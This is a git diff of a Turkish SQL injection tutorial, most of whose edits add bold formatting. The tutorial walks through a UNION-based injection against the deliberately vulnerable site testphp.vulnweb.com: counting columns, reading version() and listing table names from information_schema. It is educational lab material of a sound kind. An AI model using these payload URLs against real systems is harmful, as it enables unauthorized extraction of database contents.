@@ -10,9 +10,9 @@
 # Bazı Temel SQL sorguları.
 * Başlarken SQL'in temelini anlamak gerekiyor. Dilin temelinde nasıl çalıştığını anlamak SQL Injection'ı anlamaktır. Dolayısıyla burası önemli.
     * Kullanılacak bazı ifadeler için ön bilgi:
-        * 'SELECT' ifadesi veritabanından veri sorgulamak için kullanılır.
-        * 'string' kavramı programlama dillerinde karakterlerden oluşan dizileri ifade eder. Genellikle karakterler tırnak içinde belirtilir. 'araba', '2121231' gibi. Farklı programlama dillerinde bunları belirtme biçimi değişebilir.
-        * 'INT' ifadesi integer (tam sayı) ifade eder.
+        * ***'SELECT'*** ifadesi veritabanından veri sorgulamak için kullanılır.
+        * ***'string'*** kavramı programlama dillerinde karakterlerden oluşan dizileri ifade eder. Genellikle karakterler tırnak içinde belirtilir. 'araba', '2121231' gibi. Farklı programlama dillerinde bunları belirtme biçimi değişebilir.
+        * ***'int'*** ifadesi integer (tam sayı) ifade eder.
 
 
 * Aşağıda SQLin veritabanı mantığını anlamak amacıyla çeşitli sorgular girdik. Burada kodun bazı temel davranışlarını kavrayacağız.
@@ -64,11 +64,11 @@
 
 
     * Kullanılacak bazı ifadeler için ön bilgi:
-        * 'column' ya da kolon ifadesi veritabanında çeşitli veri değerleri taşır.
-        * 'UNION SELECT' ifadesi 2 veya daha fazla SELECT sorgusunu tek bir sonuç olarak gösterir. Sorgusu yapılanların kolon(column) sayıları eşit olmalıdır yoksa bu sorgu çalışmaz.
-        * 'version()' bu fonksiyon veri tabananında versiyon verisini çıkartır.
+        * ***'column'*** ya da kolon ifadesi veritabanında çeşitli veri değerleri taşır.
+        * ***'UNION SELECT'*** ifadesi 2 veya daha fazla SELECT sorgusunu tek bir sonuç olarak gösterir. Sorgusu yapılanların kolon(column) sayıları eşit olmalıdır yoksa bu sorgu çalışmaz.
+        * ***'version()'*** bu fonksiyon veri tabananında versiyon verisini çıkartır.
 
-* Verilen web sitesine girdikten sonra 'Browse Categories' kısmına gelip 'Posters' sekmesine tıklıyoruz ve şöyle bir ekran çıkıyor:
+* Verilen web sitesine girdikten sonra **'Browse Categories'** kısmına gelip **'Posters'** sekmesine tıklıyoruz ve şöyle bir ekran çıkıyor:
 
     ![alt text](<WebSec101 0x01_ss/image-4.png>)
 
@@ -83,40 +83,40 @@
     ![alt text](<WebSec101 0x01_ss/image-5.png>)
 
 
-* Ana sekmemizde (http://testphp.vulnweb.com/listproducts.php?cat=1) yazan yerin son kısmını (http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1) olarak değiştirip enter'a basıyoruz ve şöyle bir ekranla karşılaşıyoruz:
+* Ana sekmemizde (http://testphp.vulnweb.com/listproducts.php?cat=1) yazan yerin son kısmına **UNION SELECT 1** ekliyoruz ve enter'a basıyoruz ve şöyle bir ekranla karşılaşıyoruz:
 
     ![alt text](<WebSec101 0x01_ss/image-2.png>)
 
-* Gelen bu uyarı aslında bize bir yol haritası çiziyor. 'Error: The used SELECT statements have a different number of columns' uyarısı '1 UNION SELECT 1' sorgularından getirilen kolon(column) sayılarının eşleşmediğini söylüyor. Eşleşmeme nedeni ise UNION SELECT sorgusunun çalışması için sorguladıklarının kolon sayısının eşit olmayışıdır. 
+* Gelen bu uyarı aslında bize bir yol haritası çiziyor. **'Error: The used SELECT statements have a different number of columns'** uyarısı **'1 UNION SELECT 1'** sorgularından getirilen kolon(column) sayılarının eşleşmediğini söylüyor. Eşleşmeme nedeni ise UNION SELECT sorgusunun çalışması için sorguladıklarının kolon sayısının eşit olmayışıdır. 
 
         ```SQL
             SELECT 1; --> sonucu 1 verir ama aynı zamanda 1 kolon getirir.
             1
 
-* Bunun önüne geçmek için 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201' adresimizi 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11' olarak değiştiriyoruz. Burada amacımız aynı kolon sayısını bulmak. Bu yüzden sorgularımızı 11'e kadar arttırıyoruz. Ekranımız yine geliyor. 'NOT: SQL INJECTION YOKSA HİÇ BİR ZAMAN KOLONLARI BULAMAZSIN. ÖNCE TESPİT SONRA ENJEKSİYON'
+* Bunun önüne geçmek için 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201' adresimizi 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11' olarak değiştiriyoruz. Burada amacımız aynı kolon sayısını bulmak. Bu yüzden sorgularımızı 11'e kadar arttırıyoruz. Ekranımız yine geliyor. **NOT: SQL INJECTION YOKSA HİÇ BİR ZAMAN KOLONLARI BULAMAZSIN. ÖNCE TESPİT SONRA ENJEKSİYON**
 
 
 * referans sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1) ve ana sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11) en altına iniyoruz ve bir farklılık görüyoruz.
 
-Ana Sayfa:
+**Ana Sayfa:**
     ![alt text](<WebSec101 0x01_ss/image-6.png>) 
 
-Referans Sayfası:
+**Referans Sayfası:**
     ![alt text](<WebSec101 0x01_ss/image-7.png>)
 
-* Ana sayfadaki en son kısımda 7 2 9 sayılarını görme sebebimiz aslında adresimizde kolon sayılarının o noktalarda eşleştiğini gösteriyor. Dolayısıyla 7 2 veya 9 olan kısımlarla biz etkileşime geçebiliyoruz:
+* Ana sayfadaki en son kısımda **7 2 9** sayılarını görme sebebimiz aslında adresimizde kolon sayılarının o noktalarda eşleştiğini gösteriyor. Dolayısıyla 7 2 veya 9 olan kısımlarla biz etkileşime geçebiliyoruz:
 
-* 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' 7 yerine 'version()' yazdık ve 7 yazan yerde artık versiyon bilgisini alıyoruz.
+* 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' 7 yerine **'version()'** yazdık ve 7 yazan yerde artık versiyon bilgisini alıyoruz.
 
     ARTIK VERİ ÇIKARTMAYA BAŞLADIK
     ![alt text](<WebSec101 0x01_ss/image-8.png>)
 
-* Şimdi veri ekranımızı biraz daha temiz hale getirebiliriz. 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' adresimizde '='den sonra gelen yere '-9999999' yazarsak önceki kolonlardan kurtulmuş oluyoruz ve daha temiz bir görüntü elde ediyoruz:
+* Şimdi veri ekranımızı biraz daha temiz hale getirebiliriz. 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' adresimizde **'='** den sonra gelen yere **'-9999999'** yazarsak önceki kolonlardan kurtulmuş oluyoruz ve daha temiz bir görüntü elde ediyoruz:
 
     ![alt text](<WebSec101 0x01_ss/image-9.png>)
     * Bunun olma sebebi aslında biz 'http://testphp.vulnweb.com/listproducts.php?cat=1' sondaki id'yi değiştirmiş olduk.Id'yi değişince de ona eş değer bir veri tablosu olmadığı için boş sayfa geliyor. Yani bizim çektiğimiz veriler(id'nin sağına yazdığmız sql sorguları) dışındakiler gelmiyor.
 
-* 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,table_name,8,9,10,11' bu adresin devamına, **<span style="color:rgb(0, 255, 123)">FROM information_schema.tables WHERE table_schema = database()</span>** yazarak ve entera basarak farklı bir veri akışı sağlayacağız. Buradaki **FROM information_schema.tables WHERE table_schema = database()** sorgusunda aslında sitedeki kolon isimlerinin verisini çekiyoruz. Ve bu veriyi 7. sorgunun yerine table_name yazarak, sitede 7 yazan başlığa çekiyoruz.
+* 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,table_name,8,9,10,11' bu adresin devamına, **FROM information_schema.tables WHERE table_schema = database()** yazarak ve entera basarak farklı bir veri akışı sağlayacağız. Buradaki **FROM information_schema.tables WHERE table_schema = database()** sorgusunda aslında sitedeki kolon isimlerinin verisini çekiyoruz. Ve bu veriyi 7. sorgunun yerine table_name yazarak, sitede 7 yazan başlığa çekiyoruz.
 
     türkçesi gibi: 
     **FROM information_schema.tables WHERE table_schema = database()** = table_schema'nın veritabanına eşit olduğu yerden information_schema.tables'ı getir.
